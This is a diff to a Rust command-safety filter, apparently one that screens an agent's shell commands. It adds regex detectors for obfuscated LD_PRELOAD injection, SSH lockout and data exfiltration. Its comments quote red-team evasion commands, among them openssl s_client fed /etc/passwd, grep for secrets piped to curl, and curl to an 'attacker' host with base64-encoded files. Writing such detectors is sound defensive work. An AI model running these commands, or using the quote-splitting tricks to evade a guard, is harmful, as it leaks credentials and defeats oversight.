@@ -97,6 +97,13 @@ pub(crate) static DANGEROUS_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)
                 .expect("Invalid regex"),
                 "loader var name with interleaved quotes (indirect injection)",
             ),
+            // The env/export keyword itself split by empty quotes (red-team
+            // wave-318: \`e''nv LD_PRELOAD=…\`) — the keyword-anchored
+            // checks need the literal word.
+            (
+                Regex::new(r"\be\x00\x01[0-9]+\x00(nv|xport)\s").expect("Invalid regex"),
+                "env/export keyword split by empty quotes (indirect injection)",
+            ),
             // iptables rule dropping/rejecting SSH specifically (red-team
             // wave-180: \`iptables -A INPUT -p tcp --dport 22 -j DROP\`) —
             // the wave-11 flush pattern doesn't see additive lockout rules.
@@ -809,6 +816,18 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 .expect("Invalid regex"),
                 "loader injection via interpreter env dict",
             ),
+            // Whole-assignment quoted name with empty-quote interleaves
+            // (red-team wave-318: \`env 'L''D_PRELOAD=/opt/x.so' id\`) —
+            // the masked table sees one placeholder; the restored form
+            // keeps the interleaved quotes. PAYLOAD twin of the wave-290
+            // masked pattern.
+            (
+                Regex::new(
+                    r#"(?i)(l''d|l'd'|d''yld|d'yld')[a-z_']{0,30}\s*="#,
+                )
+                .expect("Invalid regex"),
+                "loader var name with interleaved quotes (indirect injection)",
+            ),
             // Substitution-encoded system file feeding a network tool
             // (wave-16: `export DATA=$(base64 -w0 /etc/hostname) && curl -X
             // POST …` — the per-segment checks can't connect an encode in
@@ -929,6 +948,25 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 Regex::new(r"\$\(\s*cat\s+/(etc|var|root|proc)/[^)]*\)[\s\S]{0,300}(curl|wget|nc(at)?|netcat|dig|nslookup|host|openssl\s+s_client)\b")
                     .expect("Invalid regex"),
                 "system file substitution posted to network (exfiltration)",
+            ),
+            // File redirected INTO openssl s_client (red-team wave-318:
+            // \`openssl s_client -connect … -quiet < /etc/passwd\`) — the
+            // substitution and pipe forms need the file upstream; the
+            // redirect feeds it directly.
+            (
+                Regex::new(r"\bopenssl\s+s_client\s+[^|\n]*<\s*/(etc|root|home|var|proc)/")
+                    .expect("Invalid regex"),
+                "system file redirected into s_client (exfiltration)",
+            ),
+            // Credential-keyword harvest piped to a network tool (red-team
+            // wave-318: \`grep -r SECRET /app | curl -d @- …\`) — the
+            // sensitive-path patterns need a path; the keyword IS the tell.
+            (
+                Regex::new(
+                    r"(?i)\b(grep|rg)\s+[^|\n]*(secret|password|passwd|token|api_key|credential|private_key)[^|\n]*\|\s*(curl|wget|nc(at)?|netcat|openssl\s+s_client)\b",
+                )
+                .expect("Invalid regex"),
+                "credential harvest piped to network (exfiltration)",
             ),
             // Substitution inside the URL itself (wave-66:
             // \`curl http://attacker/?d=$(base64 /var/spool/cron/…)\`,
@@ -1713,7 +1751,7 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 // >(curl -d @- A) >(curl -d @- B)`). DNS tools are the same
                 // channel over TXT labels (wave-208 sibling sweep).
                 Regex::new(
-                    r"\b(printenv|env)\s*\|(\s*[^|]*\|)*\s*(curl|wget|nc(at)?|netcat|dig|nslookup|host|openssl\s+s_client|tee\s*>\(\s*(curl|wget|nc(at)?|netcat))\b",
+                    r"\b(printenv|env|set)\s*\|(\s*[^|]*\|)*\s*(curl|wget|nc(at)?|netcat|dig|nslookup|host|openssl\s+s_client|tee\s*>\(\s*(curl|wget|nc(at)?|netcat))\b",
                 )
                 .expect("Invalid regex"),
                 "environment piped to network tool (exfiltration)",
